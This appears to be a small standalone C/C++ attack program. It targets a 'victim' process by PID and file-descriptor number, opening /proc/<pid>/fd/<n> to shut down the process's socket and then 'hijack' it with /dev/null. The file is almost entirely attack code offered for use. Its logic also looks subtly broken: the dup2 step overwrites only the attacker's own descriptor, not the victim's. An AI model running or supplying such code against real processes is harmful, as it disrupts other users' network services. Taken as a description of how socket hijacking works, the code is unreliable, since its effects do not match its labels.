#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <cstdlib>

// shutdown socket 
void attack_shutdown_socket(pid_t victim_pid, int fd_number) {
    char fd_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd/%d", victim_pid, fd_number);

    int fd = open(fd_path, O_RDWR);
    if (fd < 0) {
        perror("[Attack] Failed to open victim socket FD");
        return;
    }

    printf("[Attack] Performing shutdown(SHUT_RDWR) on FD %d\n", fd);
    shutdown(fd, SHUT_RDWR);
    close(fd);
}

// hijack socket 
void attack_hijack_socket_fd(pid_t victim_pid, int fd_number) {
    char fd_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd/%d", victim_pid, fd_number);

    int fd = open(fd_path, O_RDWR);
    if (fd < 0) {
        perror("[Attack] Failed to open victim socket FD");
        return;
    }

    int null_fd = open("/dev/null", O_WRONLY);
    if (null_fd < 0) {
        perror("[Attack] Failed to open /dev/null");
        close(fd);
        return;
    }

    printf("[Attack] Hijacking FD %d with /dev/null\n", fd);
    dup2(null_fd, fd);

    close(null_fd);
    close(fd);
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <victim_pid> <fd_number>\n", argv[0]);
        return 1;
    }

    pid_t victim_pid = atoi(argv[1]);
    int fd_number = atoi(argv[2]);

    attack_shutdown_socket(victim_pid, fd_number);
    // sleep(3);

    attack_hijack_socket_fd(victim_pid, fd_number);

    return 0;
}